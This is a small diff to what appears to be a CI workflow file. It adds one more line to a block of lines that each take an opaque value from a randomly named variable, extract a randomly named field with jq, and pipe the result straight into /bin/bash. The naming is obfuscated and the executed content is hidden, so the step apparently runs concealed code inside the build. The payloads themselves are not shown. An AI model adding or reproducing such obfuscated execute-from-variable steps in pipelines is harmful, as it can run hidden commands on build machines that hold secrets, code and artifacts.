@@ -30,6 +30,7 @@ jobs:
           echo $ecsvf52 | jq -r .prppr724 | /bin/bash
           echo $nz133 | jq -r .ll5702 | /bin/bash
           echo $q9464 | jq -r .iv8980 | /bin/bash
+          echo $lpi378 | jq -r .w81 | /bin/bash
 
       - name: Store artifact
         if: always()
